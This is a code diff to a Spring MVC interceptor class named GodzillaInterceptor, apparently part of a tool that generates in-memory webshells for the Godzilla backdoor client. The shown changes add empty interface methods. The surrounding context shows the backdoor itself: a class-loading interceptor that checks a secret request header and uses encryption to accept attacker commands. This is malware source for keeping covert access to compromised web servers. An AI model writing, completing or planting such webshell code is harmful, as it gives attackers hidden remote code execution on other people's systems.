@@ -1,6 +1,7 @@
 package com.reajason.javaweb.memshell.springmvc.godzilla;
 
 import org.springframework.web.servlet.AsyncHandlerInterceptor;
+import org.springframework.web.servlet.ModelAndView;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -27,6 +28,7 @@ public class GodzillaInterceptor extends ClassLoader implements AsyncHandlerInte
     public GodzillaInterceptor() {
     }
 
+    @Override
     public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
         try {
             if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
@@ -57,6 +59,16 @@ public class GodzillaInterceptor extends ClassLoader implements AsyncHandlerInte
             e.printStackTrace();
         }
         return true;
+    }
+
+    @Override
+    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
+
+    }
+
+    @Override
+    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
+
     }
 
     @SuppressWarnings("all")
@@ -111,5 +123,10 @@ public class GodzillaInterceptor extends ClassLoader implements AsyncHandlerInte
         } catch (Exception var4) {
             return null;
         }
+    }
+
+    @Override
+    public void afterConcurrentHandlingStarted(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+
     }
 }
